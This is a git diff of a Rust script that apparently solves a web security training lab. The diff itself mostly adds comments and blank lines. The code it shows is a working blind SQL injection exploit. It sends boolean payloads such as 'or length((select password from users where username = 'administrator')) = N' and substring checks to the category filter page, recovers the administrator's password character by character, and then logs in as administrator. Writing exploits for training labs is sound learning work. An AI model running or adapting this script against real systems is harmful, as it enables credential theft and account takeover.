@@ -39,6 +39,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a49004903c7da8b84da9c8a00f000b5.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -50,24 +51,26 @@ fn main() {
 
     // determine password length
     let password_length = determine_password_length(&client, url);
+
     // brute force password
     let admin_password = brute_force_password(&client, url, password_length);
 
     print!("\n{}", "3. Fetching login page.. ".white());
     io::stdout().flush();
+
     // fetch the login page
     let fetch_login = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch login page".red()));
-    println!("{}", "OK".green());
-    // println!("{:?}", fetch_login.headers());
 
+    println!("{}", "OK".green());
     print!(
         "{}",
         "4. Extracting csrf token and session cookie.. ".white()
     );
     io::stdout().flush();
+
     // extract session cookie
     let session = extract_session_multiple_cookies(fetch_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
@@ -75,10 +78,11 @@ fn main() {
     // extract csrf token
     let csrf =
         extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{}", "5. Logging in as the administrator.. ".white(),);
     io::stdout().flush();
+
     // login as the administrator
     let admin_login = client
         .post(format!("{url}/login"))
@@ -93,6 +97,7 @@ fn main() {
             "{}",
             "[!] Failed to login as the administrator".red()
         ));
+
     println!("{}", "OK".green());
 
     // extract the new session
@@ -101,9 +106,10 @@ fn main() {
         "[!] Failed to extract new session cookie".red()
     ));
 
-    // fetch administrator page
     print!("{}", "6. Fetching the administrator profile.. ".white(),);
     io::stdout().flush();
+
+    // fetch administrator page
     let admin = client
         .get(format!("{url}/my-account"))
         .header("Cookie", format!("session={new_session}"))
@@ -112,8 +118,8 @@ fn main() {
             "{}",
             "[!] Failed to fetch administrator profile".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
@@ -207,7 +213,9 @@ fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
 * Function to determine password length
 ********************************************/
 fn determine_password_length(client: &Client, url: &str) -> usize {
+    // variable that will hold the correct length
     let mut length = 0;
+
     for i in 1..50 {
         print!(
             "\r{} {}",
@@ -215,11 +223,13 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
             i.to_string().yellow()
         );
         io::stdout().flush();
+
         // payload to determine password length
         let payload = format!(
             "' or length((select password from users where username = 'administrator')) = {} -- -",
             i
         );
+
         // fetch the page with the injected payload
         let injection = client
             .get(format!("{url}/filter?category=Pets"))
@@ -231,7 +241,9 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
                     .red()
             ));
 
+        // get the body of the response
         let mut body = injection.text().unwrap();
+
         // extract the name of users table
         let welcom_text = extract_pattern("Welcome back!", &body);
 
@@ -242,12 +254,17 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
                 "Correct length:".white(),
                 i.to_string().green().bold()
             );
+
+            // correct length
             length = i;
+
             break;
         } else {
             continue;
         }
     }
+
+    // return the correct length
     length
 }
 
@@ -255,8 +272,11 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
 * Function to brute force password
 *************************************/
 fn brute_force_password(client: &Client, url: &str, password_length: usize) -> String {
+    // variable that will hold the correct password
     let mut correct_password = String::new();
+
     for position in 1..=password_length {
+        // iterate over possible chars
         for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
             print!(
                 "\r{} {} {} {}",
@@ -266,12 +286,14 @@ fn brute_force_password(client: &Client, url: &str, password_length: usize) -> S
                 character.to_string().yellow()
             );
             io::stdout().flush();
+
             // payload to brute force password
             let payload = format!(
             "' or substring((select password from users where username = 'administrator'), {}, 1) = '{}' -- -",
             position,
             character
         );
+
             // fetch the page with the injected payload
             let injection = client
                 .get(format!("{url}/filter?category=Pets"))
@@ -285,22 +307,28 @@ fn brute_force_password(client: &Client, url: &str, password_length: usize) -> S
 
             // body of the response
             let mut body = injection.text().unwrap();
+
             // extract the name of users table
             let welcom_text = extract_pattern("Welcome back!", &body);
 
             // if the welcome text is returned in the response
             if welcom_text.is_some() {
+                // update the correct password with the found char
                 correct_password.push(character);
+
                 print!(
                     " [ {} {} ]",
                     "Correct password:".white(),
                     correct_password.green().bold()
                 );
+
                 break;
             } else {
                 continue;
             }
         }
     }
+
+    // return the correct password
     correct_password
 }
